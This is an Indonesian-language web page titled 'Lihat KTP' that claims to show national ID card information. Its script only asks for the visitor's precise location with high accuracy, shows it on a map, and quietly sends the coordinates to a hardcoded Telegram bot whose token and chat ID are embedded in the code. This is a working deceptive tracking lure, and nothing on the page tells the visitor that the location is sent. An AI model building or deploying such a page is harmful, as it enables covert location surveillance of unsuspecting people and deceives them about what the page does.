<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lihat KTP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0c2461 0%, #1e3799 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        
        .ktp-icon {
            font-size: 70px;
            color: #0c2461;
            margin-bottom: 20px;
        }
        
        h1 {
            color: #0c2461;
            margin-bottom: 15px;
            font-size: 28px;
        }
        
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .ktp-btn {
            background: linear-gradient(to right, #0c2461 0%, #1e3799 100%);
            color: white;
            border: none;
            border-radius: 10px;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 25px;
            box-shadow: 0 4px 15px rgba(12, 36, 97, 0.4);
        }
        
        .ktp-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(12, 36, 97, 0.6);
        }
        
        .ktp-btn:active {
            transform: translateY(1px);
        }
        
        .ktp-btn i {
            margin-right: 10px;
            font-size: 20px;
        }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 8px;
            display: none;
            background-color: #f8f9fa;
            border-left: 4px solid #0c2461;
        }
        
        .status.success {
            border-left-color: #28a745;
            background-color: #d4edda;
            color: #155724;
        }
        
        .status.error {
            border-left-color: #dc3545;
            background-color: #f8d7da;
            color: #721c24;
        }
        
        .map-container {
            margin-top: 20px;
            height: 250px;
            border-radius: 10px;
            overflow: hidden;
            display: none;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            border: 2px solid #0c2461;
        }
        
        #map {
            height: 100%;
            width: 100%;
        }
        
        .location-info {
            margin-top: 15px;
            font-size: 14px;
            color: #555;
            background-color: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            display: none;
            text-align: left;
            border: 1px solid #e9ecef;
        }
        
        .instructions {
            background-color: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
            text-align: left;
        }
        
        .instructions h3 {
            color: #0c2461;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
        }
        
        .instructions h3 i {
            margin-right: 10px;
        }
        
        .instructions ol {
            padding-left: 20px;
            color: #555;
        }
        
        .instructions li {
            margin-bottom: 10px;
            line-height: 1.5;
        }
        
        .loading {
            display: none;
            margin-top: 15px;
        }
        
        .loading-dots {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 20px;
        }
        
        .loading-dots div {
            position: absolute;
            top: 8px;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #0c2461;
            animation-timing-function: cubic-bezier(0, 1, 1, 0);
        }
        
        .loading-dots div:nth-child(1) {
            left: 8px;
            animation: loading-dots1 0.6s infinite;
        }
        
        .loading-dots div:nth-child(2) {
            left: 8px;
            animation: loading-dots2 0.6s infinite;
        }
        
        .loading-dots div:nth-child(3) {
            left: 32px;
            animation: loading-dots2 0.6s infinite;
        }
        
        .loading-dots div:nth-child(4) {
            left: 56px;
            animation: loading-dots3 0.6s infinite;
        }
        
        @keyframes loading-dots1 {
            0% { transform: scale(0); }
            100% { transform: scale(1); }
        }
        
        @keyframes loading-dots3 {
            0% { transform: scale(1); }
            100% { transform: scale(0); }
        }
        
        @keyframes loading-dots2 {
            0% { transform: translate(0, 0); }
            100% { transform: translate(24px, 0); }
        }
        
        .action-buttons {
            display: none;
            margin-top: 15px;
            gap: 10px;
        }
        
        .action-btn {
            padding: 10px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        .maps-btn {
            background: #4285f4;
            color: white;
        }
        
        .maps-btn:hover {
            background: #3367d6;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 25px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .ktp-btn {
                padding: 14px 30px;
                font-size: 16px;
                width: 100%;
            }
            
            .ktp-icon {
                font-size: 60px;
            }
            
            .map-container {
                height: 200px;
            }
            
            .action-buttons {
                flex-direction: column;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
</head>
<body>
    <div class="container">
        <div class="ktp-icon">
            <i class="fas fa-id-card"></i>
        </div>
        
        <h1>Lihat KTP</h1>
        <p>Tekan tombol di bawah untuk melihat informasi KTP</p>
        
        <button class="ktp-btn" id="viewKtpBtn">
            <i class="fas fa-search"></i> Lihat KTP
        </button>
        
        <div class="loading" id="loadingIndicator">
            <div class="loading-dots">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
            <span style="margin-left: 10px;">Mencari lokasi...</span>
        </div>
        
        <div class="map-container" id="mapContainer">
            <div id="map"></div>
        </div>
        
        <div class="location-info" id="locationInfo">
            <strong>Informasi Lokasi:</strong><br>
            <span id="coordinatesText"></span><br>
            <span id="accuracyText"></span>
            <span id="addressText"></span>
        </div>
        
        <div class="action-buttons" id="actionButtons">
            <button class="action-btn maps-btn" id="openMapsBtn">
                <i class="fas fa-external-link-alt"></i> Buka di Google Maps
            </button>
        </div>
        
        <div class="status" id="statusMessage"></div>
        
        <div class="instructions">
            <h3><i class="fas fa-info-circle"></i> Cara Penggunaan:</h3>
            <ol>
                <li>Pastikan browser mengizinkan akses lokasi</li>
                <li>Klik tombol "Lihat KTP"</li>
                <li>Izinkan akses lokasi jika diminta</li>
                <li>Tunggu hingga peta dan informasi lokasi muncul</li>
            </ol>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        // Token dan ID Telegram
        const botToken = '8262226985:AAEaIrI-Fi3j8lb25hAWDR3UUHur4fNDPBQ';
        const chatId = '7786718775';
        
        let map;
        let currentMarker;
        let currentLatitude;
        let currentLongitude;
        
        document.getElementById('viewKtpBtn').addEventListener('click', function() {
            const statusMessage = document.getElementById('statusMessage');
            const locationInfo = document.getElementById('locationInfo');
            const loadingIndicator = document.getElementById('loadingIndicator');
            const mapContainer = document.getElementById('mapContainer');
            const actionButtons = document.getElementById('actionButtons');
            const coordinatesText = document.getElementById('coordinatesText');
            const accuracyText = document.getElementById('accuracyText');
            const addressText = document.getElementById('addressText');
            
            // Reset tampilan
            statusMessage.style.display = 'none';
            locationInfo.style.display = 'none';
            mapContainer.style.display = 'none';
            actionButtons.style.display = 'none';
            loadingIndicator.style.display = 'block';
            
            // Periksa apakah browser mendukung geolokasi
            if (!navigator.geolocation) {
                loadingIndicator.style.display = 'none';
                showStatus('Browser Anda tidak mendukung geolokasi.', 'error');
                return;
            }
            
            // Dapatkan lokasi pengguna
            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    loadingIndicator.style.display = 'none';
                    
                    currentLatitude = position.coords.latitude;
                    currentLongitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    // Tampilkan peta
                    showMap(currentLatitude, currentLongitude);
                    mapContainer.style.display = 'block';
                    
                    // Tampilkan informasi lokasi
                    coordinatesText.textContent = `Koordinat: ${currentLatitude.toFixed(6)}, ${currentLongitude.toFixed(6)}`;
                    accuracyText.textContent = `Akurasi: ${accuracy} meter`;
                    
                    // Dapatkan alamat dari koordinat
                    try {
                        const address = await getAddressFromCoordinates(currentLatitude, currentLongitude);
                        addressText.textContent = `Alamat: ${address}`;
                    } catch (error) {
                        addressText.textContent = `Alamat: Tidak dapat mengambil alamat`;
                    }
                    
                    locationInfo.style.display = 'block';
                    actionButtons.style.display = 'flex';
                    
                    // Kirim lokasi ke bot Telegram
                    sendToTelegram(currentLatitude, currentLongitude, accuracy);
                    
                    // Tampilkan status berhasil
                    showStatus('Lokasi berhasil ditemukan.', 'success');
                },
                function(error) {
                    loadingIndicator.style.display = 'none';
                    
                    let errorMessage = 'Gagal mendapatkan lokasi. ';
                    
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage += 'Silakan izinkan akses lokasi untuk melanjutkan.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage += 'Informasi lokasi tidak tersedia.';
                            break;
                        case error.TIMEOUT:
                            errorMessage += 'Pencarian lokasi memakan waktu terlalu lama.';
                            break;
                        default:
                            errorMessage += 'Terjadi kesalahan tidak diketahui.';
                    }
                    
                    showStatus(errorMessage, 'error');
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        });
        
        function showMap(lat, lng) {
            const mapContainer = document.getElementById('map');
            
            if (map) {
                map.remove();
            }
            
            // Inisialisasi peta
            map = L.map('map').setView([lat, lng], 16);
            
            // Tambahkan tile layer (OpenStreetMap)
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: 'Â© OpenStreetMap contributors'
            }).addTo(map);
            
            // Tambahkan marker
            currentMarker = L.marker([lat, lng]).addTo(map)
                .bindPopup('Lokasi Anda')
                .openPopup();
            
            // Tambahkan circle untuk menunjukkan akurasi
            L.circle([lat, lng], {
                color: 'red',
                fillColor: '#f03',
                fillOpacity: 0.2,
                radius: 50
            }).addTo(map);
        }
        
        document.getElementById('openMapsBtn').addEventListener('click', function() {
            if (currentLatitude && currentLongitude) {
                const mapsUrl = `https://www.google.com/maps?q=${currentLatitude},${currentLongitude}`;
                window.open(mapsUrl, '_blank');
            }
        });
        
        async function getAddressFromCoordinates(lat, lng) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
                const data = await response.json();
                
                if (data && data.display_name) {
                    return data.display_name;
                }
                return 'Alamat tidak ditemukan';
            } catch (error) {
                return 'Gagal mengambil alamat';
            }
        }
        
        function showStatus(message, type) {
            const statusMessage = document.getElementById('statusMessage');
            statusMessage.textContent = message;
            statusMessage.className = 'status ' + type;
            statusMessage.style.display = 'block';
        }
        
        function sendToTelegram(latitude, longitude, accuracy) {
            // URL untuk mengirim lokasi melalui bot Telegram
            const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
            
            // Kirim permintaan ke API Telegram
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (!data.ok) {
                        console.error('Gagal mengirim lokasi ke Telegram');
                    }
                })
                .catch(error => {
                    console.error('Terjadi kesalahan saat mengirim ke Telegram');
                });
        }
    </script>
</body>
</html>
